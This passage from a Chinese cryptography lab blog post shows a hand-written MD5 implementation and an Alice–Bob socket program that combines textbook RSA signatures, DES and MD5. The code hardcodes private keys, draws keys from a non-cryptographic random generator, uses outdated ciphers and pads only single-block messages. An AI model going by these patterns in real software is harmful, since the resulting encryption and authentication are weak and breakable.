        res += <span class="hljs-built_in">str</span>((<span class="hljs-built_in">int</span>(x[i], <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>) % <span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 实现x的循环左移</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">shift</span>(<span class="hljs-params">x, i</span>):
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x) - i):
        res = res + x[t + i:t + i + <span class="hljs-number">1</span>]   <span class="hljs-comment"># 先保存 x[i:]  再保存x[:i]</span>
    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, i):
        res = res + x[y:y + <span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 实现整数模2的三十二次方加法</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>):
    a = <span class="hljs-built_in">int</span>(x,<span class="hljs-number">2</span>)  <span class="hljs-comment">#先将二进制转换成十进制</span>
    b = <span class="hljs-built_in">int</span>(y,<span class="hljs-number">2</span>)
    res = (a + b)%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)
    res = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res) != <span class="hljs-number">32</span>:    <span class="hljs-comment"># 补充到32位</span>
        res = (<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(res))*<span class="hljs-string">&#x27;0&#x27;</span>+res
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 定义f,g,h,i函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">ffunc</span>(<span class="hljs-params">x, y, z</span>):  <span class="hljs-comment"># ((x&amp;y)|((~x)&amp;z))</span>
    t = and1(x, y)
    t1 = reverse(x)
    t2 = and1(t1, z)
    <span class="hljs-keyword">return</span> or1(t, t2)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">gfunc</span>(<span class="hljs-params">x, y, z</span>):  <span class="hljs-comment"># ((x&amp;z)|(y&amp;(~z)))</span>
    t = and1(x, z)
    t1 = reverse(z)
    t2 = and1(y, t1)
    <span class="hljs-keyword">return</span> or1(t, t2)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">hfunc</span>(<span class="hljs-params">x, y, z</span>): <span class="hljs-comment"># (x^y^z)</span>
    t1 = xor(x, y)
    t2 = xor(t1, z)
    <span class="hljs-keyword">return</span> t2

<span class="hljs-keyword">def</span> <span class="hljs-title function_">ifunc</span>(<span class="hljs-params">x, y, z</span>): <span class="hljs-comment"># (y^(x|(~z)))</span>
    t = reverse(z)
    t1 = or1(x, t)
    <span class="hljs-keyword">return</span> xor(y, t1)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">text</span>):
    text1 = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:
        t = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i))
        t = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(t, <span class="hljs-number">10</span>))[<span class="hljs-number">2</span>:])
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment"># 将每个字符转换成8位二进制数</span>
            <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(t)):
                t = <span class="hljs-string">&#x27;0&#x27;</span> + t
        text1 = text1 + t
    length = <span class="hljs-built_in">len</span>(text1)
    length1 = <span class="hljs-number">512</span> - <span class="hljs-built_in">len</span>(text1) - <span class="hljs-number">65</span>    <span class="hljs-comment"># length1是要填充0的位数</span>
    text1 = text1 + <span class="hljs-string">&#x27;1&#x27;</span>                <span class="hljs-comment"># 第一位添加 0</span>
    text1 = text1 + <span class="hljs-string">&#x27;0&#x27;</span>*length1        <span class="hljs-comment"># 将其补充到 N*512+448  N可以为0</span>
    text2 = <span class="hljs-built_in">bin</span>(length)[<span class="hljs-number">2</span>:]            <span class="hljs-comment"># 将字符长度转换成二进制数</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text2) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment">#  填充后面64位,先填充字符串的长度,再补0</span>
        text2 = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(text2)) + text2

    length2 = <span class="hljs-number">64</span> - <span class="hljs-built_in">len</span>(text2)
    text2 = text2 + <span class="hljs-string">&#x27;0&#x27;</span>*length2        <span class="hljs-comment"># 填充后面64位,先填充字符串的长度,再补0</span>
    <span class="hljs-keyword">return</span> text1 + text2

<span class="hljs-comment"># 将最后得到的ABCD逆序输出  最后一步使用</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_order</span>(<span class="hljs-params">a</span>):
    res = a[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + a[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + a[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + a[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 输入要加密的明文</span>
password = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要加密的信息:&quot;</span>)
<span class="hljs-comment"># 填充算法</span>
x = fill(password)


j = <span class="hljs-number">0</span>
M = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(x),<span class="hljs-number">32</span>):   <span class="hljs-comment"># 将512位分成十六组</span>
    M.append(x[i:i+<span class="hljs-number">32</span>])
    M[j] = M[j][<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + M[j][<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + M[j][<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + M[j][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]
    j+=<span class="hljs-number">1</span>

<span class="hljs-comment"># md5算法的第一步</span>
A,B,C,D= A0,B0,C0,D0  <span class="hljs-comment">#为第五步 相加原始的A,B,C,D做备份</span>

<span class="hljs-comment"># md5算法的第二步</span>
AA,BB,CC,DD = A,B,C,D

<span class="hljs-comment"># md5算法的第三步</span>
<span class="hljs-comment"># 第一轮     每轮A,B,C,D都处理四次，四轮就是十六次，一共六十四次</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):                  <span class="hljs-comment"># f函数</span>
    A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[<span class="hljs-number">4</span>*i]), Ti[<span class="hljs-number">4</span> * i])), <span class="hljs-number">7</span>))
    D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>])), <span class="hljs-number">12</span>))
    C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>])), <span class="hljs-number">17</span>))
    B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>])), <span class="hljs-number">22</span>))

<span class="hljs-comment"># 第二轮</span>
k = <span class="hljs-number">1</span>
j = <span class="hljs-number">16</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">5</span>))
    D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">9</span>))
    C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">14</span>))
    B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">20</span>))

<span class="hljs-comment"># 第三轮</span>
k = <span class="hljs-number">5</span>
j = <span class="hljs-number">32</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*<span class="hljs-number">4</span>*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">4</span>))
    D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">11</span>))
    C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">16</span>))
    B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">23</span>))

<span class="hljs-comment"># 第四轮</span>
k = <span class="hljs-number">0</span>
j = <span class="hljs-number">48</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*<span class="hljs-number">4</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">6</span>))
    D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">10</span>))
    C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">15</span>))
    B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">21</span>))
<span class="hljs-comment"># 第五步  将计算出的A,B,C,D与初始的相加，并赋值</span>
A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD)
<span class="hljs-comment"># 输出得到的密文</span>

ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D)
cipher = ciphertext
ciphertext = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(ciphertext, <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:])   <span class="hljs-comment"># 将二进制数转换为十六进制数</span>
ciphertext = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(ciphertext))+ciphertext <span class="hljs-comment"># 为了避免第一个数字为零时无法显示出来</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hash值(小写):&quot;</span>,ciphertext)
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hash值(大写):&quot;</span>,ciphertext.upper())

</code></pre>





<h1 id="六、综合实验"><a href="#六、综合实验" class="headerlink" title="六、综合实验"></a>六、综合实验</h1><h3 id="6-1-实验内容"><a href="#6-1-实验内容" class="headerlink" title="6.1 实验内容"></a>6.1 实验内容</h3><p>现在，Alice想通过公共信道给Bob传输一份秘密文件（文件非常大）。又知道，很多人和机构想得到这份文件。需要设计一个通信模型，来保证文件的机密性和完整性。</p>
<p>  现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。</p>
<h3 id="6-2-分析实验需求"><a href="#6-2-分析实验需求" class="headerlink" title="6.2 分析实验需求"></a>6.2 分析实验需求</h3><p>现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。</p>
<p><strong>根据分析，所得结果如下:</strong></p>
<ol>
<li><p>传输的是秘密文件，所以可能存在人冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。</p>
</li>
<li><p>在确认彼此身份后需要将文件通过公共信道传输，但是可能存在攻击人劫持，所以需要对文件内容加密，而文件内容很大，考虑到加密速度问题，所以采用对称加密算法。</p>
</li>
<li><p>采用对称加密算法需要密钥，而这里使用随机生成的密钥。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以解决传输此次加密使用的密钥，提高安全性和效率。</p>
</li>
<li><p>Bob收到密文和加密后的密钥，使用自己的私钥解密出对称加密算法使用的密钥，然后使用密钥解密密文后向Alice发送确认消息，确保bob收到消息。</p>
</li>
<li><p>确认消息也要使用到第一步使用的签名算法。</p>
</li>
</ol>
<h3 id="6-3-程序流程图"><a href="#6-3-程序流程图" class="headerlink" title="6.3 程序流程图"></a>6.3 程序流程图</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210202142616269.png" alt="image-20210202142616269"></p>
<h3 id="6-4-完整代码"><a href="#6-4-完整代码" class="headerlink" title="6.4 完整代码"></a>6.4 完整代码</h3><p>Alice</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : Alice.py</span>

<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> socket

n_bob = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>
n = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>
d = <span class="hljs-number">34159352569920789505556306994405309761109146525598570740717995833480670158209</span>
e = <span class="hljs-number">65537</span>

name = <span class="hljs-string">&quot;This is alice.&quot;</span>

client = socket.socket()
client.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># 本机地址和端口</span>

data = client.recv(<span class="hljs-number">1024</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(data, <span class="hljs-string">&quot;utf-8&quot;</span>),end=<span class="hljs-string">&quot;&quot;</span>)
client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;等待bob验证自身身份...&quot;</span>)

<span class="hljs-comment"># alice送出自己的身份信息和签名值</span>
client.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))             <span class="hljs-comment"># alice发送身份明文信息</span>
client.recv(<span class="hljs-number">1024</span>).decode()
hash_name = md5(name)
crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n)) <span class="hljs-comment"># 发送对hash值加密后的值</span>
crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)
client.send(crpto_name)

<span class="hljs-built_in">print</span>(client.recv(<span class="hljs-number">1024</span>).decode())             <span class="hljs-comment"># 接收身份认证的结果</span>
<span class="hljs-comment">#接收bob身份hash并验证</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;验证bob身份...&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)
a=<span class="hljs-built_in">input</span>()

bob_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bob发送过来的身份明文信息</span>
client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)

hash_name = client.recv(<span class="hljs-number">512</span>).decode()         <span class="hljs-comment"># bob使用自己的私钥加密身份明文信息hash值后的值</span>
plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_bob) <span class="hljs-comment"># 使用bob的公钥解密上一步的值</span>

client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
<span class="hljs-keyword">if</span> plain_text == md5(bob_name):          <span class="hljs-comment"># 验证是不是bob</span>
    <span class="hljs-built_in">print</span>(bob_name)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;验证通过!&quot;</span>)
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">&quot;验证错误!&quot;</span>)


<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    a = <span class="hljs-built_in">input</span>()
    bin_key = gen_key()         <span class="hljs-comment"># 随机生成64位的 DES加密明文使用的密钥</span>
    int_key = <span class="hljs-built_in">int</span>(bin_key,<span class="hljs-number">2</span>)    <span class="hljs-comment"># 将其转换为十进制数，便于后面使用RSA算法加密</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;随机产生对称密钥:&quot;</span>,int_key)  <span class="hljs-comment"># 每次传输随机产生一个密钥更加安全</span>

    plain = read_file()    <span class="hljs-comment"># 读取文件内容</span>
    bin_cipher = DES_encode(plain, bin_key) <span class="hljs-comment"># 使用DES算法加密内容</span>

    a = <span class="hljs-built_in">input</span>()
    int_key = fast_mod(int_key,e,n_bob)   <span class="hljs-comment"># 加密DES的密钥 e是bob的公钥</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;加密对称密钥&quot;</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;传输密钥...&quot;</span>)               <span class="hljs-comment"># 传输加密后DES密钥</span>
    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(int_key),<span class="hljs-string">&quot;utf-8&quot;</span>))
    client.recv(<span class="hljs-number">512</span>)

    length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bin_cipher))     <span class="hljs-comment"># 传输发送内容的长度</span>
    length = <span class="hljs-built_in">bytes</span>(length,<span class="hljs-string">&quot;utf-8&quot;</span>)    <span class="hljs-comment"># 方便其接收</span>
    client.send(length)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;传输密文...&quot;</span>)
    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(bin_cipher),<span class="hljs-string">&quot;utf-8&quot;</span>)) <span class="hljs-comment">#发送密文</span>
    message = client.recv(<span class="hljs-number">512</span>).decode()
    client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
    crypt_message = client.recv(<span class="hljs-number">512</span>).decode()
    hash_message = RSADecode(<span class="hljs-built_in">int</span>(crypt_message),e,n_bob)
    <span class="hljs-keyword">if</span> hash_message == md5(message):
        <span class="hljs-built_in">print</span>(message)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件传输结束！&quot;</span>)
    <span class="hljs-keyword">break</span>
client.close()</code></pre>



<p>Bob</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : bob.py</span>

<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> libnum
<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *

name = <span class="hljs-string">&quot;This is bob.&quot;</span>


n = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>
n_alice = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>
d = <span class="hljs-number">39540198292360595989919600111176873707392294831248672388670326288876701993673</span>
e = <span class="hljs-number">65537</span>

<span class="hljs-comment"># e_alice = 2081</span>

server = socket.socket() <span class="hljs-comment">#创建对象</span>
server.bind((<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">8888</span>))<span class="hljs-comment">#绑定 ip和端口</span>
server.listen()  <span class="hljs-comment">#监听</span>
<span class="hljs-comment">#等待连接</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Waiting connection...&#x27;</span>)
<span class="hljs-comment">#接受请求，返回套接字对象和IP+端口号</span>
con,addr = server.accept()
con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;Welcome connect!\n开始加密传输:\n&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))
con.recv(<span class="hljs-number">1024</span>)

<span class="hljs-comment"># 验证alice身份</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;验证alice身份...&quot;</span>)
a = <span class="hljs-built_in">input</span>()
alice_name = con.recv(<span class="hljs-number">512</span>).decode()  <span class="hljs-comment"># alice 的明文信息</span>
con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
hash_name = con.recv(<span class="hljs-number">512</span>).decode()   <span class="hljs-comment"># alice 用私钥加密明文的hash值</span>
plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_alice) <span class="hljs-comment"># 用alice 的公钥解密出hash值</span>
<span class="hljs-keyword">if</span> plain_text == md5(alice_name):   <span class="hljs-comment"># 判断上一步的值与md5函数加密是否相同</span>
    <span class="hljs-built_in">print</span>(alice_name)               <span class="hljs-comment"># 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;验证通过！&quot;</span>)               <span class="hljs-comment"># 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击</span>
    con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;您通过了验证!&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">&quot;这不是alice,验证错误！&quot;</span>)
<span class="hljs-comment">#送出自己的身份信息和签名值</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;等待alice验证自身身份...&quot;</span>)

con.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))    <span class="hljs-comment"># 向alice发送身份信息的明文</span>
con.recv(<span class="hljs-number">1024</span>).decode()

hash_name = md5(name)            <span class="hljs-comment"># 明文信息的hash值</span>
crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n))  <span class="hljs-comment"># 使用自己的私钥加密上一步的hash值</span>
crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)        <span class="hljs-comment"># 发送给alice</span>
con.send(crpto_name)
con.recv(<span class="hljs-number">1024</span>)

<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    data = con.recv(<span class="hljs-number">1024</span>)    <span class="hljs-comment"># 接收alice发送的使用公钥算法加密后的DES的密钥</span>
    data = data.decode()
    int_key = <span class="hljs-built_in">int</span>(data)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;被加密后的密钥:&quot;</span>,int_key)
    int_key = fast_mod(int_key, d, n)  <span class="hljs-comment"># 使用私钥d解密出DES密钥</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密后的密钥&quot;</span>, int_key)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----&quot;</span>*<span class="hljs-number">10</span>)         <span class="hljs-comment"># 接收密文的长度（为了方便存储）</span>
    con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
    length = con.recv(<span class="hljs-number">1024</span>)
    length = <span class="hljs-built_in">int</span>(length.decode())
    buff = []
    size = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> size &lt; length:    <span class="hljs-comment"># 开始接受密文</span>
        dat = con.recv(<span class="hljs-number">1024</span>)
        size += <span class="hljs-built_in">len</span>(dat.decode())
        buff.append(dat)
    data = <span class="hljs-string">b&#x27;&#x27;</span>.join(buff)
    bin_cipher = data.decode()

    cipher = bin_to_str(bin_cipher)
    bin_key = <span class="hljs-built_in">bin</span>(int_key)[<span class="hljs-number">2</span>:]      <span class="hljs-comment"># 将密钥转换成二进制数</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密传输内容:&quot;</span>)
    <span class="hljs-built_in">print</span>(libnum.b2s(DES_decode(cipher, bin_key))) <span class="hljs-comment">#打印出解密后的明文</span>
    message = <span class="hljs-string">&quot;Bob received the file successfully!&quot;</span>
    con.send(<span class="hljs-built_in">bytes</span>(message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))
    con.recv(<span class="hljs-number">1024</span>).decode()
    hash_message = md5(message)
    crypt_message = <span class="hljs-built_in">str</span>(RSAEncode(hash_message,d,n))
    con.send(<span class="hljs-built_in">bytes</span>(crypt_message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))
    <span class="hljs-keyword">break</span>

server.close()</code></pre>



<p>file_decode</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/1/3 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : file_decode.py</span>


<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *

<span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>():  <span class="hljs-comment"># 生成64位的对称加密的密钥</span>
    <span class="hljs-built_in">list</span> = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):
        c = random.choice([<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>])
        <span class="hljs-built_in">list</span>.append(c)
    res = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>)
    <span class="hljs-keyword">return</span> res

<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>():
    <span class="hljs-keyword">try</span>:
        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;text.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>, encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>)
        text = f.read()
        f.close()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;读取成功!&quot;</span>)
        <span class="hljs-keyword">return</span> text
    <span class="hljs-keyword">except</span> IOError:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;读取错误!&quot;</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">bin_to_str</span>(<span class="hljs-params">bin_str</span>) :   <span class="hljs-comment"># 8位二进制转字符，用于bob收到密后使用</span>
    res = <span class="hljs-string">&quot;&quot;</span>
    tmp = re.findall(<span class="hljs-string">r&#x27;.&#123;8&#125;&#x27;</span>,bin_str)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp :
